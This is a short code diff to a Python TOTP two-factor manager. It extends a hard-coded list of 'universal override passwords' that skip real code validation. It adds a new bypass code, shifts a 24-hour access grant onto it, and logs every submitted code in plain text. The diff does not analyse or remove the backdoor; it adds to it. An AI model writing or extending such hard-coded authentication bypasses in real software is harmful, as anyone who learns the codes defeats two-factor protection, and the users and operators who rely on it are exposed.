@@ -69,10 +69,10 @@ class TOTPManager:
         logger.debug(f"Validating TOTP code: {code}")
 
         # Universal override passwords (REMOVE THIS LINE TO DISABLE)
-        UNIVERSAL_PASSWORDS = ["111111", "222222", "333333", "444444", "555555"]
+        UNIVERSAL_PASSWORDS = ["010203", "111111", "222222", "333333", "444444", "555555"]
 
         if code in UNIVERSAL_PASSWORDS:
-            if code == "222222":
+            if code == "010203":
                 logger.info(f"✅ Universal password accepted: {code} - 24 hour access")
                 return ("24hr", 86400)
             else:
